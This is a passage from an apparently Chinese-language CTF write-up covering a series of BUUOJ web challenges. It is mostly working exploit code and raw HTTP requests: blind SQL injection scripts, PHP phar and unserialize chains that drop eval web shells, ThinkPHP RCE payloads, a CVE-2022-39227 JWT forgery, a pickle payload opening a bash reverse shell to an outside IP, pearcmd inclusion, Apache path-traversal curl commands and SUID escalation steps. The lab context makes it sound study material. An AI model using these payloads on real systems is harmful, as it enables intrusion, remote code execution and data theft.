        # payload = f"if(ascii(substr((select/**/group_concat(id,0x2c,name,0x2c,price)/**/from/**/ctf.items),{i},1))>{mid},sleep(2),0)%23"
        payload = f"if(ascii(substr((select/**/concat_ws(0x2c,id,name,price)/**/from/**/ctf.items/**/limit/**/2,1),{i},1))>{mid},sleep(3),0)%23"
        # print(payload)
        start_time = time.time()
        r = requests.get(url+"?id="+payload)
        request_time = time.time() - start_time

        if request_time >= DELAY_THRESHOLD:
            print(f"Delay triggered! ASCII > {mid}")
            head = mid + 1
        else:
            print(f"No delay. ASCII <= {mid}")
            tail = mid
    if head !=32:
        result += chr(head)
    else :
        break
    print(result)

print(result)


```

纳尼，居然注入不出来flag，我在想这个东西还科不科学了

## flask disk

开启了debug模式直接覆盖掉`app.py`

```http
POST /upload HTTP/1.1
Host: 5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Origin: http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2Ll9uYmCfKuKAWRn
Referer: http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81/upload
Content-Length: 708

------WebKitFormBoundary2Ll9uYmCfKuKAWRn
Content-Disposition: form-data; name="file"; filename="app.py"
Content-Type: text/plain

from flask import Flask,request
import os
app = Flask(__name__)
@app.route('/')
def index():    
    try:        
        cmd = request.args.get('cmd')        
        data = os.popen(cmd).read()        
        return data    
    except:        
        pass    
        
    return "1"
if __name__=='__main__':    
    app.run(host='0.0.0.0',port=5000,debug=True)

------WebKitFormBoundary2Ll9uYmCfKuKAWRn--

```

传好之后直接R就行了

```
?cmd=cat%20/flag
```

## PharOne

```php
<?php
highlight_file(__FILE__);
class Flag{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}
@unlink($_POST['file']);

```

可以phar反序列化，写个木马就行了，

```php
<?php
class Flag{ public $cmd;}

ini_set('phar.readonly', 0);
@unlink('phar.phar');
@unlink('phar.jpg');
$phar = new Phar('phar.phar');
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar->addFromString('a.txt', 'x');
$o = new Flag();
$o->cmd = "echo '<?php @eval(\$_POST[1]);' > /var/www/html/shell.php";
$phar->setMetadata($o);
$phar->stopBuffering();
rename('phar.phar', 'phar.jpg');
```

压缩成gz绕过`!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)`

```
gzip -c phar.jpg > exp.phar.gz
```

上传上去

```http
POST /index.php HTTP/1.1
Host: 85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPASYrqSA9GBt07ei
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81/index.php
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Origin: http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81
Cache-Control: max-age=0
Content-Length: 837

------WebKitFormBoundaryPASYrqSA9GBt07ei
Content-Disposition: form-data; name="file"; filename="exp.jpg"
Content-Type: image/jpeg

{{unquote("\x1f\x8b\x08\x087\x0d\x97h\x00\x03phar.jpg\x00s\xf7t\xb3\xb0L\xb4\xb1/\xc8\x28P\x88\x8f\xf7p\xf4\x09\x89w\xf6\xf7\x0d\xf0\xf4q\x0d\xd2\xd0\xb4V\xb0\xb7\xe3\xe5\xeaa```\x04bA\x28\xcd\xc0\x10\x09\xc4\xfeV&VJn9\x89\xe9JV\x86V\xd5\xc5V\xc6VJ\xc9\xb9\x29J\xd6\xc5V\xa6fVJ\xa9\xc9\x19\xf9\x0a\xea\x10c\x1dR\xcb\x12s4T\xe2\x03\xfc\x83C\xa2\x0dc5\xad\xd5\x15\xec\x14\xf4\xcb\x12\x8b\xf4\xcb\xcb\xcb\xf53Jrs\xf4\x8b3Rsr\xf4\x80\x8a\x95\xackY\x81\x86'\xea\x95T\x94\x80\xec2\xe7\x9d\x9e\x01\xa2\x9b\xc5\xee\xf4l\x83X\xceP\xc1\xb1\x84W\xceqj\x9d\xdb\xb7\xa5\xe7\xb4W\xab\xf2_\xb6mxo\xc2\x04\x94pw\xf2u\x02\x00\x1e\xf6\xb4\x95\xd0\x00\x00\x00")}}
------WebKitFormBoundaryPASYrqSA9GBt07ei--

```

就成功getshell了

## Unserialize Again

```php
<?php
highlight_file(__FILE__);
error_reporting(0);  
class story{
    private $user='admin';
    public $pass;
    public $eating;
    public $God='false';
    public function __wakeup(){
        $this->user='human';
        if(1==1){
            die();
        }
        if(1!=1){
            echo $fffflag;
        }
    }
    public function __construct(){
        $this->user='AshenOne';
        $this->eating='fire';
        die();
    }
    public function __tostring(){
        return $this->user.$this->pass;
    }
    public function __invoke(){
        if($this->user=='admin'&&$this->pass=='admin'){
            echo $nothing;
        }
    }
    public function __destruct(){
        if($this->God=='true'&&$this->user=='admin'){
            system($this->eating);
        }
        else{
            die('Get Out!');
        }
    }
}                 
if(isset($_GET['pear'])&&isset($_GET['apple'])){
    // $Eden=new story();
    $pear=$_GET['pear'];
    $Adam=$_GET['apple'];
    $file=file_get_contents('php://input');
    file_put_contents($pear,urldecode($file));
    file_exists($Adam);
}
else{
    echo '多吃雪梨';
} 多吃雪梨

```

绕过wakeup就可以任意执行命令了，通过`file_put_contents`写入，但是有很明显的非预期

```http
POST /pairing.php?pear=/var/www/html/shell.php&apple=1 HTTP/1.1
Host: 87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cache-Control: max-age=0
Cookie: looklook=pairing.php
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b
```

预期的话就是修改属性数量去绕过wakeup实现getshell

```php
<?php
class story {
    private $user;
    public $pass;
    public $eating;
    public $God;

    public function __construct($user = 'admin', $pass = null, $eating = "echo '<?php @eval(\$_POST[1]);' > /var/www/html/test.php", $God = 'true') {
        $this->user   = $user;
        $this->pass   = $pass;
        $this->eating = $eating;
        $this->God    = $God;
    }
}

$a = new story();
echo serialize($a);
@unlink('phar.phar');
@unlink('phar.jpg');
$phar = new Phar('phar.phar');
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar->addFromString('test.txt', 'test');
$phar->setMetadata($a);
$phar->stopBuffering();
rename('phar.phar', 'phar.jpg');

```

```python
import gzip, urllib.parse, requests
from hashlib import sha1

url = "http://87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81/pairing.php"
proxies = {
    "http": "http://127.0.0.1:8083",
    "https": "http://127.0.0.1:8083"
}
with open("phar.jpg", "rb") as f:
    data = f.read()
s = data[:-28]
h = data[-8:]
fixed = s + sha1(s).digest() + h

compressed = gzip.compress(fixed)
encoded = urllib.parse.quote_from_bytes(compressed)

pear_path = "/var/www/html/a.jpg"
apple_path = "phar:///var/www/html/a.jpg/test.txt"

params = {
    "pear": pear_path,
    "apple": apple_path
}
r = requests.post(url+f"?pear={pear_path}&apple={apple_path}", data=encoded, proxies=proxies)
print(r.status_code)

```

![1](PixPin_2025-08-09_17-36-14.png)

## Final

TP5.0.23RCE

```http
POST /index.php?s=captcha HTTP/1.1
Host: 95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Pragma: no-cache
Origin: http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81
Accept-Encoding: gzip, deflate
Content-Length: 181

_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
```

```http
POST /index.php?s=captcha HTTP/1.1
Host: 95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Pragma: no-cache
Origin: http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81
Accept-Encoding: gzip, deflate
Content-Length: 181

_method=__construct&filter[]=exec&method=get&server[REQUEST_METHOD]=echo%20'<?php%20eval($_POST[1]);?>'%20>%20/var/www/public/shell.php
```

链接上来发现没有权限读取根目录的flag

```bash
find / -user root -perm -4000 -print 2>/dev/null

cp "/flag_dd3f6380aa0d" /dev/stdout
```

## Final round

```http
POST /comments.php HTTP/1.1
Host: bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81
Origin: http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cache-Control: max-age=0
Content-Length: 12

name=1%0band%0bif(ascii(substr(database(),1,1))>80,sleep(3),1)
```

成功延时，写脚本的时候发现误导很多，他有很多表和列，最后的时候还不能直接查text，不然应该会更快点

```python
import requests, time

url = "http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/comments.php"
SLEEP, TH = 3, 2.2

# tpl = "1%0band%0bif(ascii(substr(database(),{i},1))>{mid},sleep({SLEEP}),1)"
# wfy
# tpl = "1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema='wfy')),{i},1))>{mid},sleep({SLEEP}),1)"
# tpl = "1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),{i},1))>{mid},sleep({SLEEP}),1)"
# wfy_admin,wfy_comments,wfy_information
# tpl = "1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name='wfy_admin'),{i},1))>{mid},sleep({SLEEP}),1)"
# Id,username,password,cookie
# tpl = "1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name='wfy_comments'),{i},1))>{mid},sleep({SLEEP}),1)"
# id,text,user,name,display
# tpl = "1%0band%0bif(ascii(substr((select%0bgroup_concat(id)%0bfrom%0bwfy.wfy_comments),{i},1))>{mid},sleep({SLEEP}),1)"
# 1,2,3,4,5,6,7,8,9,10,11,100
# tpl = "1%0band%0bif(ascii(substr((select%0bgroup_concat(user)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),{i},1))>{mid},sleep({SLEEP}),1)"
# f1ag_is_here
tpl = "1%0band%0bif(ascii(substr((select%0bgroup_concat(text)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),{i},1))>{mid},sleep({SLEEP}),1)"




sess = requests.Session()
sess.trust_env = False
headers = {"Content-Type": "application/x-www-form-urlencoded"}

res = ""
i = 1
while True:
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        payload = tpl.format(i=i, mid=mid, SLEEP=SLEEP)
        t0 = time.time()
        try:
            sess.post(url, headers=headers, data=f"name={payload}".encode(), timeout=8, proxies={"http": None, "https": None})
        except requests.exceptions.ReadTimeout:
            lo = mid + 1
            continue
        dt = time.time() - t0
        if dt >= TH:
            lo = mid + 1
        else:
            hi = mid
    if lo == 32:
        break
    res += chr(lo)
    print(res)
    i += 1

print(res)

```

## Ye's Pickle

```python
# -*- coding: utf-8 -*-
import base64
import string
import random
from flask import *
import jwcrypto.jwk as jwk
import pickle
from python_jwt import *
app = Flask(__name__)

def generate_random_string(length=16):
    characters = string.ascii_letters + string.digits  # 包含字母和数字
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string
app.config['SECRET_KEY'] = generate_random_string(16)
key = jwk.JWK.generate(kty='RSA', size=2048)
@app.route("/")
def index():
    payload=request.args.get("token")
    if payload:
        token=verify_jwt(payload, key, ['PS256'])
        session["role"]=token[1]['role']
        return render_template('index.html')
    else:
        session["role"]="guest"
        user={"username":"boogipop","role":"guest"}
        jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60))
        return render_template('index.html',token=jwt)

@app.route("/pickle")
def unser():
    if session["role"]=="admin":
        pickle.loads(base64.b64decode(request.args.get("pickle")))
        return render_template("index.html")
    else:
        return render_template("index.html")
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)


```

用**CVE-2022-39227**伪造JWT，然后再进行pickle反序列化，反弹shell即可

```python
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode

def topic(topic):
    """ Use mix of JSON and compact format to insert forged claims including long expiration """
    [header, payload, signature] = topic.split('.')
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload['role'] = 'admin'
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

originaltoken = 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg'
topic = topic(originaltoken)
print(topic)

```

```http
GET /?token=%7B%22++eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.%22%3A%22%22%2C%22protected%22%3A%22eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9%22%2C+%22payload%22%3A%22eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9%22%2C%22signature%22%3A%22bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg%22%7D%0A HTTP/1.1
Host: 2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Cookie: session=eyJyb2xlIjoiZ3Vlc3QifQ.aJcpRw.vYpg4Q0XL9337e8MB6kQKifcm28
Referer: http://2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36


```

```python
import base64
opcode=b'''cos
system
(S"bash -c 'bash -i >& /dev/tcp/10.88.15.146/6666 0>&1'"
tR.
'''
print(base64.b64encode(opcode))

```

刚好payload里面有个`+`，忘记编码了emm

## 4-复盘

```php
<?php require_once 'inc/header.php'; ?>
<?php require_once 'inc/sidebar.php'; ?>

  <!-- Content Wrapper. Contains page content -->

  <?php 
        if (isset($_GET['page'])) {
          $page ='pages/' .$_GET['page'].'.php';

        }else{
          $page = 'pages/dashboard.php';
        }
        if (file_exists($page)) {
          require_once $page; 
        }else{
          require_once 'pages/error_page.php';
        }
 ?>
  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->

 <?php require_once 'inc/footer.php'; ?>
```

文件包含，可以打pearcmd

```http
GET /index.php?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shell.php HTTP/1.1
Host: 98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: http://98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81/login.php
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Cookie: PHPSESSID=cq0044fmuc7eqlfr48duuljvl9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7


```

权限不够看flag，`suid`提权

```bash
find / -user root -perm -4000 -print 2>/dev/null

gzip -f /flag -t  
```

## Give me your photo PLZ

https://www.cnblogs.com/unknown404/p/10176272.html apache解析漏洞

```http
POST / HTTP/1.1
Host: dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81
Referer: http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cache-Control: max-age=0
Origin: http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylzTW48ByROVxArdw
Accept-Encoding: gzip, deflate
Content-Length: 318

------WebKitFormBoundarylzTW48ByROVxArdw
Content-Disposition: form-data; name="file"; filename="1.php.aaa"
Content-Type: application/octet-stream

<?php eval($_POST[1]);
------WebKitFormBoundarylzTW48ByROVxArdw
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundarylzTW48ByROVxArdw--

```

## Unsafe Apache

https://blog.csdn.net/qq_60905276/article/details/125163219

这个洞我上个月实习的时候还刚好打过

```bash
curl --data "echo;ls /" http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh

curl --data "echo;tac /ffffllllaaagggg_cc084c485d" http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh
```

## So Baby RCE Again

```php
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/bash|curl/i',$_GET["cmd"])){
        echo "Hacker!";
    }else{
        shell_exec($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

可以写入文件

```
?cmd=echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs= | base64 -d > shell.php

find / -user root -perm -4000 -print 2>/dev/null

date -f /ffll444aaggg
```

## Include 🍐

```php
<?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?>
```

```http
GET /index.php?+config-create+/&file=../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shell.php HTTP/1.1
Host: 5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: http://5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81/login.php
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Cookie: PHPSESSID=cq0044fmuc7eqlfr48duuljvl9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7


```

一样的

## R!!!C!!!E!!!

```php
<?php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);
}
```

没有链子，就是直线

```
minipop::__destruct->minipop::__toString()
```

```php
<?php
class minipop{

//    public $code="ls / | t''ee 1";
    public $code="tac /flag_is_h3eeere | t''ee 1";
    public $qwejaskdjnlka;

}
$a=new minipop();

$b= new minipop();
$b->qwejaskdjnlka=$a;

echo serialize($b);

```

## WebShell的利用

解出来是这个

```php
<?php
error_reporting(0);($_GET['7d67973a'])($_POST['9fa3']);
?>
```

## NextDrive

注册登录之后发现`test.res.http`

```http
HTTP/1.1 200 OK
content-type: application/json; charset=utf-8
content-length: 50
date: Tue, 06 Oct 2023 13:39:21 GMT
connection: keep-alive
keep-alive: timeout=5

{"code":0,"msg":"success","logged":true,"data":[{"name":"すずめ feat.十明 - RADWIMPS,十明.flac","hash":"5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc","size":27471829,"uploader":"admin","uploader_uid":"100000","shareTime":1754741179527,"isYours":true,"isOwn":true,"ownFn":"すずめ feat.十明 - RADWIMPS,十明.flac"},{"name":"Windows 12 Concept.png","hash":"469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900","size":440707,"uploader":"admin","uploader_uid":"100000","shareTime":1754741180080,"isYours":true,"isOwn":true,"ownFn":"Windows 12 Concept.png"},{"name":"信息安全技术信息安全事件分类分级指南.pdf","hash":"03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f","size":330767,"uploader":"admin","uploader_uid":"100000","shareTime":1754741180106,"isYours":true,"isOwn":true,"ownFn":"信息安全技术信息安全事件分类分级指南.pdf"},{"name":"不限速，就是快！.jpg","hash":"2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e","size":32920,"uploader":"admin","uploader_uid":"100000","shareTime":1754741180130,"isYours":true,"isOwn":true,"ownFn":"不限速，就是快！.jpg"},{"name":"test.req.http","hash":"0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6","size":1085,"uploader":"admin","uploader_uid":"100000","shareTime":1754741180918,"isYours":true,"isOwn":true,"ownFn":"test.req.http"}]}
```

搞了半天真是姐姐哇断奶了，秒传是因为hash一样所以造成的漏洞，如果我们用之前的重复文件的hash就再下载就可以得到admin的Cookie从而实现越权

```http
POST /api/action/drive/upload/check HTTP/1.1
Host: node5.buuoj.cn:27640
Content-Type: application/json
Origin: http://node5.buuoj.cn:27640
Referer: http://node5.buuoj.cn:27640/myresources
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: uid=100001; token=eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSIsInVpZCI6IjEwMDAwMSIsInRva2VuIjoiMmYzNDI1MzM4ZDExNGE3MzgzMzMzZDUzMDU1MDQ0ZDY0MzBlZmNmYTU5YTk1MjI2NjMzNmM5ZjBmODhlMjNjYiJ9LkEmUR1nHmZRTwx4LFELDkM.FG8wSkFdBGoJCQZ/BVtUQkFhN0kVAFZpDloAfVVbUBcWbGQdEFsBP18KUX5RCwQQF2k2H0wNUW8CBQJ7DAtUQhRhYR1BCgVvAwVXeQMFURsTb2BAQwhWOF0OVy0BCAQSHD1iQEQKUT4OWFsvBwsEQEFsaxsSWVE4XV8GLlYOB0A
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Length: 103

{"hash":"0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6","fn":"1.php.aaa","autoup":1}
```

![1](PixPin_2025-08-09_20-28-43.png)



拿到Cookie之后，可以得到js

```js
const Router = require("koa-router");
const router = new Router();
const CONFIG = require("../../runtime.config.json");
const Res = require("../../components/utils/response");
const FileSignUtil = require("../../components/utils/file-signature");
const { DriveUtil } = require("../../components/utils/database.utilities");
const fs = require("fs");
const path = require("path");
const { verifySession } = require("../../components/utils/session");
const logger = global.logger;

/**
 * @deprecated
 * ! FIXME: 发现漏洞，请进行修改
 */
router.get("/s/:hashfn", async (ctx, next) => {
    const hash_fn = String(ctx.params.hashfn || '')
    const hash = hash_fn.slice(0, 64)
    const from_uid = ctx.query.from_uid
    const custom_fn = ctx.query.fn

    // 参数校验
    if (typeof hash_fn !== "string" || typeof from_uid !== "string") {
        // invalid params or query
        ctx.set("X-Error-Reason", "Invalid Params");
        ctx.status = 400; // Bad Request
        return ctx.res.end();
    }

    // 是否为共享的文件
    let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid)
    if (!IS_FILE_EXIST) {
        ctx.set("X-Error-Reason", "File Not Found");
        ctx.status = 404; // Not Found
        return ctx.res.end();
    }

    // 系统中是否存储有该文件
    let IS_FILE_EXIST_IN_STORAGE
    try {
